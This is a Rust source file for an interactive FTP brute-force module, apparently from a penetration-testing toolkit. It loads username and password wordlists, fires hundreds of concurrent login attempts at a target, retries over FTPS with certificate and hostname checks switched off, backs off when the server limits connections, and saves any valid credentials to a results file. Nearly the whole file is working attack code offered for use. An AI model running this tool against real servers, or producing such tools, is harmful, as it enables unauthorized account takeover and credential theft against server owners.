use anyhow::{anyhow, Result};
use suppaftp::{
    AsyncFtpStream,
    AsyncNativeTlsFtpStream,
    AsyncNativeTlsConnector,
};
use suppaftp::async_native_tls::TlsConnector;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    path::PathBuf,
    sync::Arc,
};
use tokio::{sync::Mutex, time::{sleep, Duration}};
use std::path::Path;
use sysinfo::System;
use futures::stream::{FuturesUnordered, StreamExt};

async fn dynamic_throttle(running: usize, max_concurrency: usize) {
    let mut system = System::new_all();
    system.refresh_all();

    let cpu_usage = system.cpus().iter().map(|cpu| cpu.cpu_usage()).sum::<f32>() / system.cpus().len() as f32;
    let ram_used = system.used_memory() as f32 / system.total_memory() as f32;

    if cpu_usage > 80.0 || ram_used > 0.8 {
        sleep(Duration::from_millis(50)).await;
    } else if cpu_usage > 60.0 || ram_used > 0.6 {
        sleep(Duration::from_millis(25)).await;
    } else if running > max_concurrency {
        sleep(Duration::from_millis(10)).await;
    } else {
        sleep(Duration::from_millis(1)).await;
    }
}


/// Format IPv4 or IPv6 addresses with port
fn format_addr(target: &str, port: u16) -> String {
    if target.starts_with('[') && target.contains("]:") {
        target.to_string()
    } else if target.matches(':').count() == 1 && !target.contains('[') {
        target.to_string()
    } else {
        let clean = if target.starts_with('[') && target.ends_with(']') {
            &target[1..target.len() - 1]
        } else {
            target
        };
        if clean.contains(':') {
            format!("[{}]:{}", clean, port)
        } else {
            format!("{}:{}", clean, port)
        }
    }
}

pub async fn run(target: &str) -> Result<()> {
    println!("=== FTP Brute Force Module ===");
    println!("[*] Target: {}", target);

    let port: u16 = loop {
        let input = prompt_default("FTP Port", "21")?;
        if let Ok(p) = input.parse() { break p }
        println!("Invalid port. Try again.");
    };
    let usernames_file = prompt_required("Username wordlist")?;
    let passwords_file = prompt_required("Password wordlist")?;
    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "500")?; // default 500 (higher)
        if let Ok(n) = input.parse::<usize>() {
            if n > 0 { break n }
        }
        println!("Invalid number. Try again.");
    };

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file", "ftp_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode (user × pass)?", false)?;

    let addr = format_addr(target, port);
    let found = Arc::new(Mutex::new(Vec::new()));
    let stop = Arc::new(Mutex::new(false));

    println!("\n[*] Starting brute-force on {}", addr);

    let users = load_lines(&usernames_file)?;
    let passes = load_lines(&passwords_file)?;

    let mut tasks = FuturesUnordered::new();

    if combo_mode {
        // Every user × every pass
        for user in &users {
            for pass in &passes {
                let addr = addr.clone();
                let user = user.clone();
                let pass = pass.clone();
                let found = Arc::clone(&found);
                let stop = Arc::clone(&stop);

                tasks.push(tokio::spawn(async move {
                    if *stop.lock().await { return; }
                    match try_ftp_login(&addr, &user, &pass).await {
                        Ok(true) => {
                            println!("[+] {} -> {}:{}", addr, user, pass);
                            found.lock().await.push((addr.clone(), user.clone(), pass.clone()));
                            if stop_on_success {
                                *stop.lock().await = true;
                            }
                        }
                        Ok(false) => {
                            log(verbose, &format!("[-] {} -> {}:{}", addr, user, pass));
                        }
                        Err(e) => {
                            log(verbose, &format!("[!] {}: error: {}", addr, e));
                        }
                    }
                }));
            }
        }
    } else {
        // Line-by-line (user1 with pass1, user2 with pass2, etc.)
        for (i, pass) in passes.iter().enumerate() {
            let user = users.get(i % users.len()).unwrap_or(&users[0]).clone();
            let addr = addr.clone();
            let pass = pass.clone();
            let found = Arc::clone(&found);
            let stop = Arc::clone(&stop);

            tasks.push(tokio::spawn(async move {
                if *stop.lock().await { return; }
                match try_ftp_login(&addr, &user, &pass).await {
                    Ok(true) => {
                        println!("[+] {} -> {}:{}", addr, user, pass);
                        found.lock().await.push((addr.clone(), user.clone(), pass.clone()));
                        if stop_on_success {
                            *stop.lock().await = true;
                        }
                    }
                    Ok(false) => {
                        log(verbose, &format!("[-] {} -> {}:{}", addr, user, pass));
                    }
                    Err(e) => {
                        log(verbose, &format!("[!] {}: error: {}", addr, e));
                    }
                }
            }));
        }
    }

    // 💥 Here is the correct task runner with dynamic throttling!
    let mut running = 0;
while let Some(res) = tasks.next().await {
    dynamic_throttle(running, concurrency).await;
    res?;
    running += 1;
}

    // After all tasks are finished, print/save results
    let creds = found.lock().await;
    if creds.is_empty() {
        println!("\n[-] No credentials found.");
    } else {
        println!("\n[+] Valid credentials:");
        for (host, user, pass) in creds.iter() {
            println!("    {} -> {}:{}", host, user, pass);
        }
        if let Some(path) = save_path {
            let file_path = get_filename_in_current_dir(&path);
            let mut file = File::create(&file_path)?;
            for (host, user, pass) in creds.iter() {
                writeln!(file, "{} -> {}:{}", host, user, pass)?;
            }
            println!("[+] Results saved to '{}'", file_path.display());
        }
    }

    Ok(())
}


/// Try FTP login and only fallback to FTPS if "SSL/TLS required" is detected
async fn try_ftp_login(addr: &str, user: &str, pass: &str) -> Result<bool> {
    match AsyncFtpStream::connect(addr).await {
        Ok(mut ftp) => {
            match ftp.login(user, pass).await {
                Ok(_) => {
                    let _ = ftp.quit().await;
                    return Ok(true);
                }
                Err(e) => {
                    let msg = e.to_string();
                    if msg.contains("530") {
                        return Ok(false);
                    } else if msg.contains("550 SSL/TLS required") {
                        // fall through
                    } else if msg.contains("421") {
                        // 421 Too many connections
                        println!("[-] 421 Too many connections, sleeping 2 seconds...");
                        sleep(Duration::from_secs(2)).await;
                        return Ok(false);
                    } else {
                        return Err(anyhow!("FTP error: {}", msg));
                    }
                }
            }
        }
        Err(e) => {
            let msg = e.to_string();
            if msg.contains("550 SSL/TLS required") {
                // fall through
            } else if msg.contains("421") {
                println!("[-] 421 Too many connections, sleeping 2 seconds...");
                sleep(Duration::from_secs(2)).await;
                return Ok(false);
            } else {
                return Err(anyhow!("FTP connection error: {}", msg));
            }
        }
    }

    // 2️⃣ Only if needed, try FTPS
    let mut ftp_tls = AsyncNativeTlsFtpStream::connect(addr)
        .await
        .map_err(|e| anyhow!("FTPS connect failed: {}", e))?;

    let connector = AsyncNativeTlsConnector::from(
        TlsConnector::new()
            .danger_accept_invalid_certs(true)
            .danger_accept_invalid_hostnames(true),
    );

    let domain = addr
        .trim_start_matches('[')
        .split(&[']', ':'][..])
        .next()
        .unwrap_or(addr);

    ftp_tls = ftp_tls
        .into_secure(connector, domain)
        .await
        .map_err(|e| anyhow!("TLS upgrade failed: {}", e))?;

    match ftp_tls.login(user, pass).await {
        Ok(_) => {
            let _ = ftp_tls.quit().await;
            Ok(true)
        }
        Err(e) => {
            let msg = e.to_string();
            if msg.contains("530") {
                Ok(false) // Bad login
            } else {
                Err(anyhow!("FTPS error: {}", msg))
            }
        }
    }
}


// === Helpers ===

fn prompt_required(msg: &str) -> Result<String> {
    loop {
        print!("{}: ", msg);
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let trimmed = s.trim();
        if !trimmed.is_empty() {
            return Ok(trimmed.to_string());
        }
        println!("This field is required.");
    }
}

fn prompt_default(msg: &str, default: &str) -> Result<String> {
    print!("{} [{}]: ", msg, default);
    std::io::stdout().flush()?;
    let mut s = String::new();
    std::io::stdin().read_line(&mut s)?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        default.to_string()
    } else {
        trimmed.to_string()
    })
}

fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
    let default = if default_yes { "y" } else { "n" };
    loop {
        print!("{} (y/n) [{}]: ", msg, default);
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let input = s.trim().to_lowercase();
        match input.as_str() {
            "" => return Ok(default_yes),
            "y" | "yes" => return Ok(true),
            "n" | "no" => return Ok(false),
            _ => println!("Invalid input. Please enter 'y' or 'n'."),
        }
    }
}

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    Ok(reader.lines().filter_map(Result::ok).collect())
}

fn log(verbose: bool, msg: &str) {
    if verbose {
        println!("{}", msg);
    }
}

fn get_filename_in_current_dir(input: &str) -> PathBuf {
    Path::new(input)
        .file_name()
        .map(|n| PathBuf::from(format!("./{}", n.to_string_lossy())))
        .unwrap_or_else(|| PathBuf::from(input))
}
